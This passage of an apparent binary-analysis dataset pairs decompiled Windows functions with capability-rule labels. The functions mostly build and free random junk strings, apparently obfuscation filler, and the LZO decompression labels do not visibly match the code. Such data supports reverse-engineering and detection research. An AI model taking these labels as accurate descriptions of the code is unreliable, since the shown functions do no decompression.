uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x00441c72;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack112) {\n            iVar1 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar1))\n            goto code_r0x00441c7e;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack136) {\n            iVar1 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar1 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar1))\n            goto code_r0x00441c8a;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar1 = *(iStack108 + -4),  (iStack108 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00441ba4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00441c72:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00441c7e:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00441c8a:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1168
    },
    "0040498f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040498f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x4148e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 5;\n    pcStack112 = \"xnacwavdeaehpuwlebtdiaeotghdvimzwbrwbfxakkhdtco\";\n    auStack120[0] = 0x2f;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x2f, iStack84, \"xnacwavdeaehpuwlebtdiaeotghdvimzwbrwbfxakkhdtco\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x2f, uStack36, \"xnacwavdeaehpuwlebtdiaeotghdvimzwbrwbfxakkhdtco\");\n    if (uStack64 < 0x10) {\ncode_r0x0040efdd:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0040f0f2;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x0040f0fe;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0040f10a;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x0040f116;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0040efdd;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040f0f2:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040f0fe:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040f10a:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040f116:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1132
    },
    "004049f3": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.004049f3(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    uchar auStack36 [4];\n    uchar *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack36;\n    uStack24 = 0x44c5e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x14);\n    if (0xf < in_stack_0000001c) {\n        iVar2 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043179f;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < in_stack_00000054) {\n        iVar2 = in_stack_00000040;\n        if ((0xfff < in_stack_00000054 + 1) &&\n           (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) {\ncode_r0x0043179f:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            puVar1 = fcn.00403a76();\n            return puVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 527
    },
    "00404a8e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404a8e(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c120;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"beltgaueizskuirnddggbisqwteckzruuosxkxgjhwfzutgxeeqzcqzr\";\n    auStack144[0] = 0x38;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x50, iStack60, \"kyijwxjnoxvpewesnxkwajgvbslqtjtejsjesarlbqizsnssuveunmhikiipblwuxjmuhjabsgqdfuau\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x38, uStack84, \"beltgaueizskuirnddggbisqwteckzruuosxkxgjhwfzutgxeeqzcqzr\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x38, uStack36, \"beltgaueizskuirnddggbisqwteckzruuosxkxgjhwfzutgxeeqzcqzr\");\n    if (uStack64 < 0x10) {\ncode_r0x004223e7:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042269d;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x38, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \n                     \"beltgaueizskuirnddggbisqwteckzruuosxkxgjhwfzutgxeeqzcqzr\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x38, uStack36, \"beltgaueizskuirnddggbisqwteckzruuosxkxgjhwfzutgxeeqzcqzr\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x004226a9;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x004226b5;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x50, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \n                     \"kyijwxjnoxvpewesnxkwajgvbslqtjtejsjesarlbqizsnssuveunmhikiipblwuxjmuhjabsgqdfuau\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x50, uStack36, \"kyijwxjnoxvpewesnxkwajgvbslqtjtejsjesarlbqizsnssuveunmhikiipblwuxjmuhjabsgqdfuau\")\n        ;\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x004226c1;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004226cd;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004226d9;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x004226e5;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x004223db:\n        fcn.00401a32(uVar1);\n        goto code_r0x004223e7;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x004223db;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042269d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004226a9:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004226b5:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004226c1:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004226cd:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x004226d9:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x004226e5:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 2178
    },
    "00404ac0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404ac0(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    uchar **ppuVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_00000028;\n    uint in_stack_00000038;\n    uint32_t in_stack_0000003c;\n    uint32_t in_stack_00000044;\n    uint in_stack_00000054;\n    uint32_t in_stack_00000058;\n    uchar *in_stack_0000005c;\n    uint32_t in_stack_00000070;\n    uint uStack316;\n    uchar uStack312;\n    char *pcStack308;\n    int32_t iStack304;\n    uint uStack288;\n    uint32_t uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack264;\n    uint uStack260;\n    int32_t iStack256;\n    uint uStack240;\n    uint32_t uStack236;\n    int32_t iStack232;\n    uint uStack216;\n    uint32_t uStack212;\n    int32_t iStack208;\n    uint uStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    uint uStack168;\n    uint32_t uStack164;\n    uchar uStack160;\n    uint *puStack156;\n    int32_t *piStack152;\n    uint uStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint32_t uStack136;\n    uchar **ppuStack112;\n    int32_t *piStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    int32_t iStack76;\n    uint32_t uStack56;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack96 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44bfc0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x0041e838:\n        ppuStack32 = ppuVar1;\n        in_stack_0000001c = 0;\n        in_stack_00000020 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (0xf < in_stack_0000003c) {\n            uStack136 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (uStack136 = *(in_stack_00000028 - 4),  unaff_EDI = uStack136, \n               0x1f < (in_stack_00000028 - 4) - uStack136)) goto code_r0x0041e936;\n            fcn.00401a32(uStack136);\n        }\n        in_stack_00000038 = 0;\n        in_stack_0000003c = 0xf;\n        in_stack_00000028 = in_stack_00000028 & 0xffffff00;\n        if (0xf < in_stack_00000058) {\n            uStack136 = in_stack_00000044;\n            if ((0xfff < in_stack_00000058 + 1) &&\n               (uStack136 = *(in_stack_00000044 - 4),  unaff_EDI = uStack136, \n               0x1f < (in_stack_00000044 - 4) - uStack136)) goto code_r0x0041e942;\n            fcn.00401a32(uStack136);\n        }\n        in_stack_00000054 = 0;\n        in_stack_00000058 = 0xf;\n        in_stack_00000044 = in_stack_00000044 & 0xffffff00;\n        if (in_stack_00000070 < 0x10) {\ncode_r0x0041e912:\n            *in_FS_OFFSET = piStack28;\n            return 0x4ec;\n        }\n        puStack96 = in_stack_0000005c;\n        if ((in_stack_00000070 + 1 < 0x1000) ||\n           (puStack96 = *(in_stack_0000005c + -4),  uStack136 = unaff_EDI,  in_stack_0000005c + (-4 - puStack96) < 0x20)\n           ) {\n            fcn.00401a32(puStack96);\n            goto code_r0x0041e912;\n        }\n    }\n    else {\n        uStack136 = param_3;\n        if ((in_stack_00000020 + 1 < 0x1000) ||\n           (uStack136 = *(param_3 - 4),  unaff_EDI = uStack136,  (param_3 - 4) - uStack136 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack136);\n            ppuVar1 = ppuStack32;\n            goto code_r0x0041e838;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0041e936:\n        uStack20 = 1;\n        fcn.004047f5();\ncode_r0x0041e942:\n        uStack20 = 2;\n        fcn.004047f5();\n    }\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    ppuStack112 = &ppuStack112;\n    uStack100 = 0xffffffff;\n    uStack104 = 0x44bfd0;\n    piStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack108;\n    if (uStack56 < 0x10) {\ncode_r0x0041ea03:\n        *in_FS_OFFSET = piStack108;\n        return 1;\n    }\n    iStack140 = iStack76;\n    uStack92 = uStack136;\n    if ((uStack56 + 1 < 0x1000) || (iStack140 = *(iStack76 + -4),  (iStack76 + -4) - iStack140 < 0x20)) {\n        ppuStack112 = &ppuStack112;\n        fcn.00401a32(iStack140);\n        goto code_r0x0041ea03;\n    }\n    uStack100 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack156 = &uStack316;\n    uStack144 = 0xffffffff;\n    uStack148 = 0x44bfe0;\n    piStack152 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack152;\n    uStack288 = 0;\n    uStack284 = 0xf;\n    iStack304 = 0;\n    uStack312 = iStack208;\n    pcStack308 = \"zwjryyvwikgajtybtpeci\";\n    uStack316 = 0x15;\n    fcn.00402f72();\n    uStack192 = 0;\n    uStack188 = 0xf;\n    iStack208 = 0;\n    uStack144 = 5;\n    fcn.00402f72(0x2c, uStack280, \"sfoutpfnikbcmaynpqcyavnpeyhbnvotduuvjdlhmivh\");\n    uStack260 = 0xf;\n    uStack264 = 0xb;\n    uStack280 = 0x67746a68;\n    uStack276 = 0x76657765;\n    uStack272 = 0x727769;\n    uStack240 = 0;\n    uStack236 = 0xf;\n    iStack256 = 0;\n    uStack144 = 6;\n    fcn.00402f72(0x32, iStack184, \"aoptipnxdaolwositorktbkaddwqtisbxrcezypdwkrzragndn\");\n    uStack168 = 0;\n    uStack164 = 0xf;\n    iStack184 = 0;\n    uStack144 = 7;\n    fcn.00402f72(0x15, iStack232, \"zwjryyvwikgajtybtpeci\");\n    uStack216 = 0;\n    uStack212 = 0xf;\n    iStack232 = 0;\n    uStack144 = 8;\n    fcn.00402f72(0x15, uStack160, \"zwjryyvwikgajtybtpeci\");\n    if (uStack212 < 0x10) {\ncode_r0x0041ec33:\n        if (0xf < uStack164) {\n            iVar3 = iStack184;\n            if ((0xfff < uStack164 + 1) && (iVar3 = *(iStack184 + -4),  0x1f < (iStack184 + -4) - iVar3))\n            goto code_r0x0041ed44;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack236) {\n            iVar3 = iStack256;\n            if ((0xfff < uStack236 + 1) && (iVar3 = *(iStack256 + -4),  0x1f < (iStack256 + -4) - iVar3))\n            goto code_r0x0041ed50;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack188) {\n            iVar3 = iStack208;\n            if ((0xfff < uStack188 + 1) && (iVar3 = *(iStack208 + -4),  0x1f < (iStack208 + -4) - iVar3))\n            goto code_r0x0041ed5c;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack284) {\n            iVar3 = iStack304;\n            if ((0xfff < uStack284 + 1) && (iVar3 = *(iStack304 + -4),  0x1f < (iStack304 + -4) - iVar3))\n            goto code_r0x0041ed68;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack152;\n        return 0x27c6;\n    }\n    iVar3 = iStack232;\n    if ((uStack212 + 1 < 0x1000) || (iVar3 = *(iStack232 + -4),  (iStack232 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x0041ec33;\n    }\n    uStack144 = 0;\n    fcn.004047f5();\ncode_r0x0041ed44:\n    uStack144 = 1;\n    fcn.004047f5();\ncode_r0x0041ed50:\n    uStack144 = 2;\n    fcn.004047f5();\ncode_r0x0041ed5c:\n    uStack144 = 3;\n    fcn.004047f5();\ncode_r0x0041ed68:\n    uStack144 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar2 = fcn.00403a76();\n    return uVar2;\n}\n",
        "token_count": 2690
    },
    "00404ad9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00404ad9(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414980;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"grbwgvsgobqxkphrfxqcekgveioon\";\n    auStack144[0] = 0x1d;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x40, iStack60, \"ppvcldspjcyycvnqjwdpxysvmdszregdtnhdeuumbopgnrvamsghbgeirodrvbqe\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x40, uStack84, \"ppvcldspjcyycvnqjwdpxysvmdszregdtnhdeuumbopgnrvamsghbgeirodrvbqe\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x40, uStack36, \"ppvcldspjcyycvnqjwdpxysvmdszregdtnhdeuumbopgnrvamsghbgeirodrvbqe\");\n    if (uStack64 < 0x10) {\ncode_r0x004115c7:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0041178f;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 7;\n        fcn.00402f72(0x1d, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \"grbwgvsgobqxkphrfxqcekgveioon\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x1d, uStack36, \"grbwgvsgobqxkphrfxqcekgveioon\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0041179b;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004117a7;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004117b3;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x004117bf;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x4ea3e8;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x004115bb:\n        fcn.00401a32(uVar1);\n        goto code_r0x004115c7;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x004115bb;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041178f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0041179b:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004117a7:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004117b3:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004117bf:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 1611
    },
    "00404ae3": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404ae3(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c230;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 5;\n    pcStack136 = \"mlhnxnvtanuatwbgiasmtsctaehhie\";\n    auStack144[0] = 0x1e;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x26, iStack60, \"tqmoeqvlxraczahijvpduvdtsumdgdnkyuhtcq\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x1e, iStack108, \"mlhnxnvtanuatwbgiasmtsctaehhie\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x1e, uStack36, \"mlhnxnvtanuatwbgiasmtsctaehhie\");\n    if (uStack88 < 0x10) {\ncode_r0x004257fe:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00425908;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00425914;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00425920;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0042592c;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) 